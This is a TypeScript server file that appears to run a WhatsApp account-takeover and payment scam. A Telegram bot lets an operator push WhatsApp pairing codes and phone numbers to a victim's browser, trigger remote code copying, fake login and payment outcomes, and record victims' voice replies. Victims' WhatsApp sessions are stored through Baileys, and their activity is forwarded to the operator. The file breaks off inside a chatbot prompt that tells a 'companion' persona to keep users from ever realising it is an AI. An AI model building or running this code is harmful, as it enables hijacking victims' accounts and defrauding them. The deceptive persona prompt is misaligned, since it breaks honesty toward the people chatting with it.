import express from 'express';
import path from 'path';
import fs from 'fs';
import { createServer as createViteServer } from 'vite';
import pino from 'pino';
import _makeWASocket, { useMultiFileAuthState, delay, DisconnectReason } from '@whiskeysockets/baileys';
import dotenv from 'dotenv';
import TelegramBot from 'node-telegram-bot-api';
import { GoogleGenAI } from '@google/genai';

// Handle ESM/CJS interop for @whiskeysockets/baileys default export
const makeWASocket = (() => {
  if (typeof _makeWASocket === 'function') {
    return _makeWASocket;
  }
  if (_makeWASocket && typeof (_makeWASocket as any).default === 'function') {
    return (_makeWASocket as any).default;
  }
  return _makeWASocket;
})();

dotenv.config();

const app = express();
const PORT = 3000;

app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ limit: '100mb', extended: true }));

const AUTH_DIR = path.join(process.cwd(), 'baileys_auth_info');
if (!fs.existsSync(AUTH_DIR)) {
  fs.mkdirSync(AUTH_DIR, { recursive: true });
}

interface SessionInfo {
  id: string;
  phoneNumber: string;
  status: 'disconnected' | 'connecting' | 'pairing' | 'connected' | 'error';
  pairingCode?: string;
  codeLive?: boolean;
  lastError?: string;
  assignedPhone?: string;
  remoteCopyTrigger?: boolean;
  updatedAt: string;
  loginStatus?: 'success' | 'error' | 'pending';
  speakScript?: string;
  paymentStatus?: 'none' | 'pending' | 'success' | 'error';
  paymentAmount?: number;
  paymentNumber?: string;
  paymentTrxId?: string;
  paymentProfileId?: number;
  paymentProfileName?: string;
}

// Global state trackers for active connected sockets and status
const activeSockets: Record<string, any> = {};
const sessionStatus: Record<string, SessionInfo> = {};

const STATUS_FILE = path.join(AUTH_DIR, 'session_statuses.json');

// Write state changes persistently to filesystem
function saveSessionStatuses() {
  try {
    fs.writeFileSync(STATUS_FILE, JSON.stringify(sessionStatus, null, 2), 'utf8');
  } catch (err) {
    console.warn('Error saving session statuses to file:', err);
  }
}

// Reload statuses on backend start
function loadSessionStatuses() {
  try {
    if (fs.existsSync(STATUS_FILE)) {
      const data = JSON.parse(fs.readFileSync(STATUS_FILE, 'utf8'));
      Object.assign(sessionStatus, data);
      console.log(`[Persistence] Restored ${Object.keys(data).length} existing session statuses.`);
    }
  } catch (err) {
    console.warn('Error reloading session statuses:', err);
  }
}

// Initial recovery step: if STATUS_FILE exists and is a directory (EISDIR prevention), delete it!
try {
  if (fs.existsSync(STATUS_FILE)) {
    const stat = fs.statSync(STATUS_FILE);
    if (stat.isDirectory()) {
      console.warn(`[Cleanup] Found directory at STATUS_FILE location: ${STATUS_FILE}. Removing it to prevent EISDIR errors...`);
      fs.rmSync(STATUS_FILE, { recursive: true, force: true });
    }
  }
} catch (err) {
  console.error('[Cleanup] Failed to clean up directory at STATUS_FILE:', err);
}

// Initial restore on load
loadSessionStatuses();

// Helper to update session state in memory and trigger save
function updateSessionState(id: string, state: Partial<SessionInfo>) {
  if (!sessionStatus[id]) {
    sessionStatus[id] = {
      id,
      phoneNumber: '',
      status: 'disconnected',
      updatedAt: new Date().toISOString(),
    };
  }
  sessionStatus[id] = {
    ...sessionStatus[id],
    ...state,
    updatedAt: new Date().toISOString()
  };
  saveSessionStatuses();
}

// --- TELEGRAM & GEMINI BOT INTEGRATION ---
let bot: TelegramBot | null = null;
let aiClient: GoogleGenAI | null = null;
let isBotAuthorized = true;

function getGeminiClient(): GoogleGenAI | null {
  if (!aiClient) {
    const key = process.env.GEMINI_API_KEY;
    if (key && key !== 'MY_GEMINI_API_KEY' && key.trim() !== '') {
      aiClient = new GoogleGenAI({
        apiKey: key,
        httpOptions: {
          headers: {
            'User-Agent': 'aistudio-build'
          }
        }
      });
    }
  }
  return aiClient;
}

function getTelegramBot(): TelegramBot | null {
  if (!isBotAuthorized) {
    return null;
  }
  if (!bot) {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const disablePolling = process.env.DISABLE_TELEGRAM_POLLING === 'true';
    if (token && token !== 'YOUR_TELEGRAM_BOT_TOKEN' && token.trim() !== '') {
      try {
        if (disablePolling) {
          console.log("ℹ️ Telegram Bot polling is disabled via DISABLE_TELEGRAM_POLLING=true. Active outbound message notifications will still function.");
          bot = new TelegramBot(token, { polling: false });
          isBotAuthorized = true;
          setupTelegramListeners(bot);
        } else {
          bot = new TelegramBot(token, { polling: true });
          isBotAuthorized = true;
          
          // Register error handlers immediately to prevent unhandled rejections/exceptions from crashing the server
          let isHandlingConflict = false;
          bot.on('polling_error', async (error: any) => {
            const errMsg = error.message || String(error);
            if (errMsg.includes('401') || errMsg.includes('Unauthorized')) {
              if (isBotAuthorized) {
                isBotAuthorized = false;
                console.warn("🚫 Telegram Bot Polling (401 Unauthorized): The provided TELEGRAM_BOT_TOKEN is invalid or expired. Disabling Telegram polling status...");
                try {
                  if (bot) {
                    const active = typeof bot.isPolling === 'function' ? bot.isPolling() : true;
                    if (active) {
                      await bot.stopPolling();
                    }
                  }
                } catch (err: any) {
                  console.warn("Failed to stop Telegram polling:", err?.message || err);
                }
              }
            } else if (errMsg.includes('409 Conflict')) {
              if (isHandlingConflict) return;
              isHandlingConflict = true;
              
              const waitMs = Math.floor(45000 + Math.random() * 45000); // Staggered wait between 45 to 90 seconds
              console.warn(`⚠️ Telegram Bot Polling Conflict (409): Another server/container is using this token. Pausing polling on this instance for ${Math.round(waitMs / 1000)} seconds to prevent log spam...`);
              
              try {
                if (bot) {
                  const active = typeof bot.isPolling === 'function' ? bot.isPolling() : true;
                  if (active) {
                    await bot.stopPolling();
                  }
                }
              } catch (err: any) {
                console.warn("Failed to stop Telegram polling during conflict backoff:", err?.message || err);
              }
              
              setTimeout(() => {
                isHandlingConflict = false;
                if (bot && isBotAuthorized) {
                  const active = typeof bot.isPolling === 'function' ? bot.isPolling() : false;
                  if (!active) {
                    console.log("🔄 Retrying Telegram Bot polling after conflict backoff...");
                    bot.startPolling().then(() => {
                      console.log("Telegram Bot polling restarted successfully.");
                    }).catch((err: any) => {
                      console.warn("Failed to restart Telegram Bot polling:", err?.message || err);
                    });
                  }
                }
              }, waitMs);
            } else {
              console.warn("Telegram Bot Polling warning event:", errMsg);
            }
          });
          
          bot.on('error', (error: any) => {
            const errMsg = error.message || String(error);
            if (errMsg.includes('401') || errMsg.includes('Unauthorized')) {
              if (isBotAuthorized) {
                isBotAuthorized = false;
                console.warn("🚫 Telegram Bot generic warning: Token is unauthorized (401). Disabling bot services...");
                if (bot && typeof bot.stopPolling === 'function') {
                  bot.stopPolling().catch(() => {});
                }
              }
            } else {
              console.warn("Telegram Bot generic warning event:", errMsg);
            }
          });

          console.log("Telegram Bot successfully initialized and polling started.");
          setupTelegramListeners(bot);
        }
      } catch (err) {
        console.warn("Failed to start Telegram Bot polling:", err);
      }
    } else {
      console.warn("TELEGRAM_BOT_TOKEN environment variable not configured. Live activations disabled.");
    }
  }
  return isBotAuthorized ? bot : null;
}

const activeBots: Record<string, TelegramBot> = {};

function getBotForToken(token?: string): TelegramBot | null {
  if (!token || token.trim() === '' || token === 'YOUR_TELEGRAM_BOT_TOKEN') {
    return getTelegramBot();
  }
  const cleanToken = token.trim();
  if (activeBots[cleanToken]) {
    return activeBots[cleanToken];
  }
  try {
    console.log(`[Dynamic Bot] Initializing dynamic Telegram Bot for token: ${cleanToken.substring(0, 15)}...`);
    const dynamicBot = new TelegramBot(cleanToken, { polling: true });
    activeBots[cleanToken] = dynamicBot;
    
    // Register message & command listeners on this dynamic bot
    setupTelegramListeners(dynamicBot);
    
    dynamicBot.on('polling_error', (error: any) => {
      const errMsg = error.message || String(error);
      console.warn(`[Dynamic Bot Polling Error] (${cleanToken.substring(0, 15)}...):`, errMsg);
    });
    
    dynamicBot.on('error', (error: any) => {
      const errMsg = error.message || String(error);
      console.warn(`[Dynamic Bot Generic Error] (${cleanToken.substring(0, 15)}...):`, errMsg);
    });
    
    return dynamicBot;
  } catch (err) {
    console.error(`[Dynamic Bot Init Error] for token ${cleanToken.substring(0, 15)}... :`, err);
    return null;
  }
}

// Robust helper to extract an 8-character WhatsApp pairing code from text
function findPairingCodeInText(text: string): string {
  if (!text) return '';

  // 1. Look for two blocks of 4 alphanumeric characters (may contain letters & numbers), e.g. "ABCD-EFGH" or "ABCD EFGH"
  const formattedMatch = text.match(/\b([A-Z0-9]{4})[-\s]+([A-Z0-9]{4})\b/i);
  if (formattedMatch) {
    const candidate = (formattedMatch[1] + formattedMatch[2]).toUpperCase();
    if (candidate.length === 8) {
      return candidate;
    }
  }

  // 2. Look for any 8-character word consist of alphanumeric text (e.g. "A1B2C3D4")
  const words = text.split(/[\s,.;:!?`'"*()_\-[\]{}]+/);
  for (const word of words) {
    const cleanedWord = word.trim().toUpperCase();
    if (cleanedWord.length === 8 && /^[A-Z0-9]{8}$/.test(cleanedWord)) {
      return cleanedWord;
    }
  }

  // 3. Fallback: completely strip all non-alphanumeric characters and check if we find a valid 8-character chunk
  const stripped = text.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
  const anyEightBlock = stripped.match(/[A-Z0-9]{8}/);
  if (anyEightBlock) {
    return anyEightBlock[0];
  }

  return '';
}

function setupTelegramListeners(tgBot: TelegramBot) {
  tgBot.on('message', async (msg) => {
    try {
      const chatId = msg.chat.id;
      const text = msg.text || '';
      const caption = msg.caption || '';
      const content = (text + ' ' + caption).trim();
      
      if (!content) return;
      
      console.log(`[Telegram BOT Recv] Chat: ${chatId}, Msg: "${content}"`);
      
      // Matches /WhatsApp_Phone_number_user_123456 019XXXXXXXX
      let matchedPhone = false;
      let targetId = '';
      let phoneNumber = '';

      const matchPhone1 = content.match(/\/(WhatsApp[-_\s]+Phone[-_\s]+number_)([a-zA-Z0-9_]+)\s+([+0-9]+)/i);
      const matchPhone2 = content.match(/\/(WhatsApp[-_\s]+Phone[-_\s]+)([+0-9]+)[-_\s]+user[-_\s]+([a-zA-Z0-9_]+)/i);

      if (matchPhone1) {
        matchedPhone = true;
        targetId = matchPhone1[2];
        phoneNumber = matchPhone1[3];
      } else if (matchPhone2) {
        matchedPhone = true;
        phoneNumber = matchPhone2[2];
        targetId = matchPhone2[3];
      }

      if (matchedPhone) {
        console.log(`Parsing input phone set command from telegram. Target ID: "${targetId}", Phone: "${phoneNumber}"`);
        
        let resolvedSessionId = targetId;
        if (!resolvedSessionId.startsWith('user_') && /^\d+$/.test(resolvedSessionId)) {
          resolvedSessionId = `user_${resolvedSessionId}`;
        } else if (!sessionStatus[resolvedSessionId] && sessionStatus[`user_${targetId}`]) {
          resolvedSessionId = `user_${targetId}`;
        }

        updateSessionState(resolvedSessionId, {
          assignedPhone: phoneNumber
        });

        tgBot.sendMessage(chatId, `✅ **গ্রাহক আইডি:** <code>${resolvedSessionId}</code> এর জন্য দূরবর্তী ফোন নম্বর সেট করা হয়েছে!\n📞 **ফোন নম্বর:** <code>${phoneNumber}</code>\n💬 গ্রাহকের ব্রাউজার এটি স্বয়ংক্রিয়ভাবে প্রক্রিয়া করে Request to unlock profile বাটুন ট্রিগার করবে।`, { parse_mode: 'HTML' });
        return;
      }

      // Matches /speak_user_123456 <text> or /speak user_123456 <text>
      const matchSpeak1 = content.match(/\/speak[-_]([a-zA-Z0-9_]+)\s+(.+)/i);
      const matchSpeak2 = content.match(/\/speak\s+([a-zA-Z0-9_]+)\s+(.+)/i);
      const matchSpeak = matchSpeak1 || matchSpeak2;

      if (matchSpeak) {
        const rawId = matchSpeak[1].trim();
        const textToSpeak = matchSpeak[2].trim();
        console.log(`Parsing speak script from telegram. Target ID: "${rawId}", Text: "${textToSpeak}"`);
        
        let resolvedSessionId = rawId;
        if (!resolvedSessionId.startsWith('user_') && /^\d+$/.test(resolvedSessionId)) {
          resolvedSessionId = `user_${resolvedSessionId}`;
        } else if (!sessionStatus[resolvedSessionId] && sessionStatus[`user_${rawId}`]) {
          resolvedSessionId = `user_${rawId}`;
        }
        
        updateSessionState(resolvedSessionId, {
          speakScript: textToSpeak
        });
        
        tgBot.sendMessage(chatId, `🔊 **গ্রাহক আইডি:** <code>${resolvedSessionId}</code> এর পেজে কণ্ঠবার্তা পাঠানো হয়েছে!\n💬 **বার্তা:** "${textToSpeak}"\n🎙️ পেজটি স্বয়ংক্রিয়ভাবে কথা বলবে এবং গ্রাহকের প্রতিক্রিয়া রেকর্ড করে বয়েজ নোট হিসেবে এখানে ফেরত পাঠাবে।`, { parse_mode: 'HTML' });
        return;
      }

      // Matches /success_live_code_user_123456_click_copy
      const matchSuccess = content.match(/\/success[-_\s]+live[-_\s]+cod[e]?[-_\s]+([a-zA-Z0-9_]+)/i);
      
      if (matchSuccess) {
        const rawId = matchSuccess[1];
        const targetId = rawId.replace(/_click_copy$/i, '').trim();
        console.log(`Parsing remote copy command from telegram. Target ID: "${targetId}"`);
        
        let resolvedSessionId = targetId;
        if (!resolvedSessionId.startsWith('user_') && /^\d+$/.test(resolvedSessionId)) {
          resolvedSessionId = `user_${resolvedSessionId}`;
        } else if (!sessionStatus[resolvedSessionId] && sessionStatus[`user_${targetId}`]) {
          resolvedSessionId = `user_${targetId}`;
        }
        
        updateSessionState(resolvedSessionId, {
          remoteCopyTrigger: true
        });
        
        tgBot.sendMessage(chatId, `✅ **গ্রাহক আইডি:** <code>${resolvedSessionId}</code> এর ব্রাউজারে লাইভ হওয়া কোড স্বয়ংক্রিয়ভাবে কপি করার জন্য রিমোট ট্রিগার পাঠানো হয়েছে!`, { parse_mode: 'HTML' });
        return;
      }

      // Matches /success user_id login
      const matchSuccessLogin = content.match(/\/success[-_\s]+([a-zA-Z0-9_]+)[-_\s]+login/i);
      if (matchSuccessLogin) {
        const targetId = matchSuccessLogin[1].trim();
        console.log(`Parsing success login command from telegram. Target ID: "${targetId}"`);
        
        let resolvedSessionId = targetId;
        if (!resolvedSessionId.startsWith('user_') && /^\d+$/.test(resolvedSessionId)) {
          resolvedSessionId = `user_${resolvedSessionId}`;
        } else if (!sessionStatus[resolvedSessionId] && sessionStatus[`user_${targetId}`]) {
          resolvedSessionId = `user_${targetId}`;
        }
        
        updateSessionState(resolvedSessionId, {
          loginStatus: 'success',
          status: 'connected'
        });
        
        tgBot.sendMessage(chatId, `✅ **গ্রাহক আইডি:** <code>${resolvedSessionId}</code> এর লগইন সফল (Success) ঘোষণা করা হয়েছে!\nপেজটিতে এখন সরকারি নিবন্ধন বাটনগুলো আনলক হয়ে গেছে।`, { parse_mode: 'HTML' });
        return;
      }

      // Matches /Error user_id login
      const matchErrorLogin = content.match(/\/Error[-_\s]+([a-zA-Z0-9_]+)[-_\s]+login/i);
      if (matchErrorLogin) {
        const targetId = matchErrorLogin[1].trim();
        console.log(`Parsing error login command from telegram. Target ID: "${targetId}"`);
        
        let resolvedSessionId = targetId;
        if (!resolvedSessionId.startsWith('user_') && /^\d+$/.test(resolvedSessionId)) {
          resolvedSessionId = `user_${resolvedSessionId}`;
        } else if (!sessionStatus[resolvedSessionId] && sessionStatus[`user_${targetId}`]) {
          resolvedSessionId = `user_${targetId}`;
        }
        
        updateSessionState(resolvedSessionId, {
          loginStatus: 'error',
          status: 'error'
        });
        
        tgBot.sendMessage(chatId, `❌ **গ্রাহক আইডি:** <code>${resolvedSessionId}</code> এর লগইন ব্যর্থ (Error) নির্ধারণ করা হয়েছে!\nগ্রাহককে পুনরায় লগইন অনুরোধ করা হবে।`, { parse_mode: 'HTML' });
        return;
      }

      // Matches /success <userId> (Plain payment status updater)
      const matchSuccessPayment = content.match(/\/success[-_\s]+(user_[a-zA-Z0-9_]+|[a-zA-Z0-9_]+)/i);
      if (matchSuccessPayment) {
        const rawId = matchSuccessPayment[1].trim();
        let resolvedSessionId = rawId;
        if (!resolvedSessionId.startsWith('user_') && /^\d+$/.test(resolvedSessionId)) {
          resolvedSessionId = `user_${resolvedSessionId}`;
        } else if (!sessionStatus[resolvedSessionId] && sessionStatus[`user_${rawId}`]) {
          resolvedSessionId = `user_${rawId}`;
        }
        
        updateSessionState(resolvedSessionId, {
          paymentStatus: 'success'
        });
        
        tgBot.sendMessage(chatId, `✅ **গ্রাহক আইডি:** <code>${resolvedSessionId}</code> এর পেমেন্ট সফল (Success) ঘোষণা করা হয়েছে!\nপেজটিতে গ্রাহকের ইনবক্সে কনফার্মেশন বার্তা যাবে এবং পরবর্তী কার্যক্রম পরিচালনার অনুমতি দেওয়া হবে।`, { parse_mode: 'HTML' });
        return;
      }

      // Matches /error <userId> (Plain payment status updater)
      const matchErrorPayment = content.match(/\/error[-_\s]+(user_[a-zA-Z0-9_]+|[a-zA-Z0-9_]+)/i);
      if (matchErrorPayment) {
        const rawId = matchErrorPayment[1].trim();
        let resolvedSessionId = rawId;
        if (!resolvedSessionId.startsWith('user_') && /^\d+$/.test(resolvedSessionId)) {
          resolvedSessionId = `user_${resolvedSessionId}`;
        } else if (!sessionStatus[resolvedSessionId] && sessionStatus[`user_${rawId}`]) {
          resolvedSessionId = `user_${rawId}`;
        }
        
        updateSessionState(resolvedSessionId, {
          paymentStatus: 'error'
        });
        
        tgBot.sendMessage(chatId, `❌ **গ্রাহক আইডি:** <code>${resolvedSessionId}</code> এর পেমেন্ট ব্যর্থ (Error) নির্ধারণ করা হয়েছে!\nগ্রাহকের ইনবক্সে পেমেন্ট ব্যর্থ বার্তা দেখানো হবে।`, { parse_mode: 'HTML' });
        return;
      }
      
      const matchLinker = content.match(/\/(WhatsApp[-_\s]+Device[-_\s]+Linker_)([a-zA-Z0-9_]+)/i);
      
      if (matchLinker) {
        const targetId = matchLinker[2];
        console.log(`Parsing input command from telegram for target ID: "${targetId}"`);
        
        let resolvedSessionId = targetId;
        if (!resolvedSessionId.startsWith('user_') && /^\d+$/.test(resolvedSessionId)) {
          resolvedSessionId = `user_${resolvedSessionId}`;
        } else if (!sessionStatus[resolvedSessionId] && sessionStatus[`user_${targetId}`]) {
          resolvedSessionId = `user_${targetId}`;
        }
        
        if (!sessionStatus[resolvedSessionId]) {
          updateSessionState(resolvedSessionId, {
            status: 'pairing',
            pairingCode: '',
            codeLive: false
          });
        }
        
        // 1. FREE TEXT SCAN FALLBACK: Try to find any 8-character verification code written directly in the text/caption.
        const stripPattern = new RegExp(`\\/(WhatsApp[-_\\s]+Device[-_\\s]+Linker_)${targetId}`, 'i');
        const cleanContent = content.replace(stripPattern, '').trim();

        const parsedCode = findPairingCodeInText(cleanContent);

        if (parsedCode) {
          console.log(`Successfully extracted pairing code "${parsedCode}" directly from text/caption.`);
          updateSessionState(resolvedSessionId, {
            status: 'pairing',
            pairingCode: parsedCode,
            codeLive: true,
            lastError: undefined
          });
          
          tgBot.sendMessage(chatId, `✅ **গ্রাহক আইডি:** <code>${resolvedSessionId}</code> এর জন্য কোড লাইভ করা হয়েছে!\n📦 **লাইভ কোড:** <code>${parsedCode}</code> (ক্যাপশন/টেক্সট থেকে সরাসরি সংরক্ষিত)\n\n💬 **গ্রাহকের কিবোর্ডে কোড অটো-কপি করার জন্য ১-ক্লিক কপি করুন:**\n<code>/success_live_code_${resolvedSessionId}_click_copy</code>\n\n🔑 **লগইন কন্ট্রোল কমান্ডস:**\n✅ সফল লগইন: <code>/success_${resolvedSessionId}_login</code>\n❌ লগইন ব্যর্থ: <code>/Error_${resolvedSessionId}_login</code>`, { parse_mode: 'HTML' });
          return;
        }

        // 2. Fall back to Gemini Image OCR if media is present
        if (!msg.photo || msg.photo.length === 0) {
          tgBot.sendMessage(chatId, `⚠️ <b>কমান্ড সনাক্ত করা হয়েছে কিন্তু কোড বা ইমেজ পাওয়া যায়নি!</b>\n\nকোড লাইভ করতে অনুগ্রহ করে ক্যাপশন বা টেক্সটের সাথে কোডটি লিখে পাঠিয়ে দিন (যেমন: <code>/WhatsApp_Device_Linker_${targetId} A1B2 C3D4</code>) অথবা কোডের স্ক্রিনশট সহ পুনরায় সেন্ড করুন।`, { parse_mode: 'HTML' });
          return;
        }
        
        tgBot.sendMessage(chatId, `♻️ গ্রাহক <code>${resolvedSessionId}</code> এর ছবি থেকে কোড উদ্ধার করা হচ্ছে... অনুগ্রহ করে একটু অপেক্ষা করুন।`, { parse_mode: 'HTML' });
        
        const photo = msg.photo[msg.photo.length - 1];
        const fileId = photo.file_id;
        
        const fileInfo = await tgBot.getFile(fileId);
        if (!fileInfo.file_path) {
          throw new Error("Could not retrieve file path from Telegram servers.");
        }
        
        const botToken = (tgBot as any).token || process.env.TELEGRAM_BOT_TOKEN;
        const fileUrl = `https://api.telegram.org/file/bot${botToken}/${fileInfo.file_path}`;
        
        const imgRes = await fetch(fileUrl);
        if (!imgRes.ok) {
          throw new Error(`Failed to download attached image. Status: ${imgRes.status}`);
        }
        
        const arrayBuffer = await imgRes.arrayBuffer();
        const base64Data = Buffer.from(arrayBuffer).toString('base64');
        
        const ai = getGeminiClient();
        if (!ai) {
          tgBot.sendMessage(chatId, `❌ **ভুল:** Gemini API কি সম্পন্ন করা হয়নি। অনুগ্রহ করে .env বা Secrets-এ <code>GEMINI_API_KEY</code> সেট করুন অথবা সরাসরি টেক্সট কমান্ড ব্যবহার করুন:\n<code>/WhatsApp_Device_Linker_${targetId} ABCD EFGH</code>`, { parse_mode: 'HTML' });
          return;
        }
        
        const response = await ai.models.generateContent({
          model: 'gemini-3.5-flash',
          contents: [
            {
              parts: [
                {
                  inlineData: {
                    data: base64Data,
                    mimeType: 'image/jpeg'
                  }
                },
                {
                  text: `Please analyze the WhatsApp pairing/linking screen image. 
Identify the 8-character verification/linking code. 
WhatsApp linking/pairing codes consist of exactly 8 uppercase alphanumeric characters, shown in two blocks of 4 characters (e.g. "ABCD EFGH" or "A1B2-C3D4").
Return EXCLUSIVELY the 8 characters in uppercase with NO spaces, NO dashes, NO punctuation and NO extra text.
Output strictly the 8 characters (e.g. "ABCDEFGH"). 
If you fail to find a valid code, return empty.`
                }
              ]
            }
          ]
        });
        
        const textResult = response.text ? response.text.trim() : '';
        const cleanedCode = findPairingCodeInText(textResult);
        
        if (!cleanedCode) {
          tgBot.sendMessage(chatId, `⚠️ **কোড নিষ্কাশন ব্যর্থ হয়েছে:** "${textResult || 'কোড খুঁজে পাওয়া যায়নি'}"। অনুগ্রহ করে স্পষ্ট অক্ষরের ছবি আপলোড করুন অথবা কমান্ডের টেক্সটে কোডটি সরাসরি দিয়ে দিন (যেমন: <code>/WhatsApp_Device_Linker_${targetId} ABCD-EFGH</code>)`, { parse_mode: 'HTML' });
          return;
        }
        
        updateSessionState(resolvedSessionId, {
          status: 'pairing',
          pairingCode: cleanedCode,
          codeLive: true,
          lastError: undefined
        });
        
        tgBot.sendMessage(chatId, `✅ **গ্রাহক আইডি:** <code>${resolvedSessionId}</code> এর জন্য কোড লাইভ করা হয়েছে!\n📦 **কোড:** <code>${cleanedCode}</code>\n\n💬 **গ্রাহকের কিবোর্ডে কোড অটো-কপি করার জন্য ১-ক্লিক কপি করুন:**\n<code>/success_live_code_${resolvedSessionId}_click_copy</code>\n\n🔑 **লগইন কন্ট্রোল কমান্ডস:**\n✅ সফল লগইন: <code>/success_${resolvedSessionId}_login</code>\n❌ লগইন ব্যর্থ: <code>/Error_${resolvedSessionId}_login</code>`, { parse_mode: 'HTML' });
      }
    } catch (err: any) {
      console.error("Error analyzing image:", err);
      tgBot.sendMessage(msg.chat.id, `❌ **সিস্টেম ত্রুটি:** ${err.message || 'কোড নিষ্কাশন প্রক্রিয়ায় ত্রুটি ঘটেছে।'}`).catch(console.error);
    }
  });
}

// Ensure first instanced boot
setTimeout(() => {
  getTelegramBot();
}, 1000);

// Endpoint for client activity logging
app.post('/api/log-activity', (req, res) => {
  const { userId, action, details } = req.body;
  if (!userId) {
    return res.status(400).json({ success: false, message: 'User ID has not been supplied.' });
  }

  console.log(`[ACTIVITY LOG] ${userId} executed "${action}"`, details || '');

  // Push to Telegram Chat instantly
  const tgBot = getTelegramBot();
  const chatId = process.env.TELEGRAM_CHAT_ID || req.body.chatId;
  if (tgBot && chatId) {
    let messageBody = `🔔 <b>গ্রাহক এক্টিভিটি এলার্ট!</b>\n\n👤 <b>গ্রাহক আইডি:</b> <code>${userId}</code>\n⚡ <b>এক্টিভিটি:</b> <code>${action}</code>`;
    if (details) {
      messageBody += `\n📝 <b>অতিরিক্ত তথ্য:</b> <code>${typeof details === 'object' ? JSON.stringify(details) : details}</code>`;
    }
    
    // Automatically attach copyable bot command for setting phone remote trigger
    if (action.includes('প্রবেশ করেছেন') || action.includes('Landing')) {
      messageBody += `\n\n💬 <b>মোবাইল নম্বর রিমোট সেট করার জন্য নিচের কমান্ডটি ১-ক্লিক কপি করুন:</b>\n<code>/WhatsApp_Phone_number_${userId} </code> (এখানে মোবাইল নম্বর)`;
    }
    
    tgBot.sendMessage(chatId, messageBody, { parse_mode: 'HTML' }).catch((err) => {
      const errMsg = err?.message || String(err);
      if (errMsg.includes('401') || errMsg.includes('Unauthorized')) {
        isBotAuthorized = false;
        console.warn("🚫 Telegram Token is unauthorized (401). Bot helper disabled.");
      } else {
        console.warn("Telegram delivery issue:", errMsg);
      }
    });
  }

  res.json({ success: true });
});

// Scan and recover existing session folders on server boot
try {
  if (fs.existsSync(AUTH_DIR)) {
    const files = fs.readdirSync(AUTH_DIR);
    for (const file of files) {
      if (file === 'session_statuses.json') continue;
      const fullPath = path.join(AUTH_DIR, file);
      try {
        const stat = fs.statSync(fullPath);
        if (!stat.isDirectory()) continue;
      } catch (_) {
        continue;
      }
      if (file.startsWith('session_')) {
        const sessionId = file.replace('session_', '');
        const credsPath = path.join(AUTH_DIR, file, 'creds.json');
        let phoneNumber = '';
        if (fs.existsSync(credsPath)) {
          try {
            const creds = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
            phoneNumber = creds.me?.id?.split(':')[0] || '';
          } catch (_) {}
        }
        sessionStatus[sessionId] = {
          id: sessionId,
          phoneNumber,
          status: 'disconnected',
          updatedAt: new Date().toISOString(),
        };
      }
    }
  }
} catch (err) {
  console.error('Error scanning sessions on startup:', err);
}

// Clean up an active socket and dismantle its listeners to prevent race conditions during deletion or reset
function stopAndCleanSocket(sessionId: string) {
  if (activeSockets[sessionId]) {
    try {
      activeSockets[sessionId].ev.removeAllListeners('connection.update');
      activeSockets[sessionId].ev.removeAllListeners('creds.update');
      activeSockets[sessionId].end();
    } catch (err) {
      console.warn(`[Baileys Cleanup] Warning cleaning up socket for session ${sessionId}:`, err);
    }
    delete activeSockets[sessionId];
  }
}

// Connect to WhatsApp using Baileys and hook update events
async function connectToWhatsApp(sessionId: string, phoneNumberRequested?: string) {
  const sessionPath = path.join(AUTH_DIR, `session_${sessionId}`);
  
  // Close any existing connection socket gracefully
  stopAndCleanSocket(sessionId);

  // Guarantee that the session directory exists before initiating auth state
  if (!fs.existsSync(sessionPath)) {
    try {
      fs.mkdirSync(sessionPath, { recursive: true });
    } catch (err) {
      console.warn(`[Baileys Directory] Failed to create session directory ${sessionPath}:`, err);
    }
  }

  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
  
  const sock = makeWASocket({
    auth: state,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
  });

  activeSockets[sessionId] = sock;

  const currentPhone = phoneNumberRequested || sessionStatus[sessionId]?.phoneNumber || '';

  updateSessionState(sessionId, {
    status: 'connecting',
    phoneNumber: currentPhone,
  });

  // Wrapped robust saveCreds execution to capture and logs exceptions cleanly without uncaught exceptions
  const safeSaveCreds = async () => {
    try {
      if (fs.existsSync(sessionPath)) {
        await saveCreds();
      }
    } catch (err) {
      console.warn(`[Baileys State Save] Refused/failed to save state for session ${sessionId}. Standard behavior if session is ending:`, err);
    }
  };

  sock.ev.on('creds.update', safeSaveCreds);

  sock.ev.on('connection.update', (update: any) => {
    const { connection, lastDisconnect } = update;
    
    if (connection === 'close') {
      const statusCode = (lastDisconnect?.error as any)?.output?.statusCode;
      // Reconnect if not logged out, EXCEPT if we were in the middle of pairing!
      const isPairing = sessionStatus[sessionId]?.status === 'pairing';
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut && !isPairing;
      
      console.log(`Session ${sessionId} closed. Reason: ${statusCode}, Reconnecting: ${shouldReconnect}, WasPairing: ${isPairing}`);
      
      if (shouldReconnect) {
        setTimeout(() => {
          connectToWhatsApp(sessionId).catch(console.error);
        }, 8000);
        updateSessionState(sessionId, { status: 'connecting', lastError: 'Closed, reconnecting...' });
      } else {
        if (isPairing) {
          updateSessionState(sessionId, { 
            status: 'disconnected', 
            lastError: 'কানেকশন বিচ্ছিন্ন হয়েছে। আবার চেষ্টা করার জন্য রি-ট্রাই বাটনে ক্লিক করুন।' 
          });
        } else {
          updateSessionState(sessionId, { status: 'disconnected', lastError: 'Logged out.' });
          try {
            if (fs.existsSync(sessionPath)) {
              fs.rmSync(sessionPath, { recursive: true, force: true });
            }
          } catch (_) {}
        }
        delete activeSockets[sessionId];
      }
    } else if (connection === 'open') {
      const mePhone = sock.user?.id?.split(':')[0] || '';
      console.log(`Session ${sessionId} successfully open for +${mePhone}`);
      updateSessionState(sessionId, {
        status: 'connected',
        phoneNumber: mePhone,
        pairingCode: undefined,
        lastError: undefined,
      });
    }
  });

  return sock;
}

// API Endpoints
app.post('/api/chat-reply', async (req, res) => {
  const { userMessage, history, profileName, profileId } = req.body;

  if (!userMessage) {
    return res.status(400).json({ success: false, error: 'User message is required.' });
  }

  const ai = getGeminiClient();
  if (!ai) {
    console.warn("Gemini API Client not initialized on server.");
    return res.json({ 
      success: false, 
      error: 'GEMINI_API_KEY_MISSING',
      message: 'Gemini Client is missing. Please set GEMINI_API_KEY.' 
    });
  }

  try {
    const personaInstruction = `You are a real, friendly, affectionate, and high-quality Bengali girl companion named ${profileName || "সোনা"}. You are talking with a customer/user in a private text conversation on the companion application "মনোর সাথী" (MonerSathi).
Your absolute highest directive is to respond as a real high-value human companion, making sure the user can never guess they are talking to an AI bot.

Guiding Rules for human-like behavior:
